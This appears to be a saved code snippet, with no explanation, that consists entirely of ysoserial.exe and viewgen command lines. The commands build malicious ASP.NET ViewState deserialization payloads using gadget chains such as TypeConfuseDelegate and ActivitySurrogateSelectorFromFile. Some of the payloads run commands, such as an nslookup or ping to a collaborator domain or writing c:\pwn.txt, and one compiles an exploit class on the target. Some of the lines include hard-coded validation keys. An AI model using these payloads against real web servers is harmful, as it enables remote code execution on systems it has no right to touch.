---
id: 5e3fbda5-651f-4133-b30a-34849133ef0c
type: code
language: Powershell
verified: false
created_at: '2023-04-06T03:55:53.408018+00:00'
updated_at: '2023-04-06T03:55:53.411480+00:00'
---

# Code Snippet 5e3fbda5

**Language**: Powershell

```powershell
$ ysoserial.exe -p ViewState  -g TextFormattingRunProperties -c "cmd.exe /c nslookup <your collab domain>"  --decryptionalg="AES" --generator=ABABABAB decryptionkey="<decryption key>"  --validationalg="SHA1" --validationkey="<validation key>"
$ ysoserial.exe -p ViewState -g TypeConfuseDelegate -c "echo 123 > c:\pwn.txt" --generator="CA0B0334" --validationalg="MD5" --validationkey="b07b0f97365416288cf0247cffdf135d25f6be87"
$ ysoserial.exe -p ViewState -g ActivitySurrogateSelectorFromFile -c "C:\Users\zhu\Desktop\ExploitClass.cs;C:\Windows\Microsoft.NET\Framework64\v4.0.30319\System.dll;C:\Windows\Microsoft.NET\Framework64\v4.0.30319\System.Web.dll" --generator="CA0B0334" --validationalg="SHA1" --validationkey="b07b0f97365416288cf0247cffdf135d25f6be87"

$ viewgen --webconfig web.config -m CA0B0334 -c "ping yourdomain.tld"
```


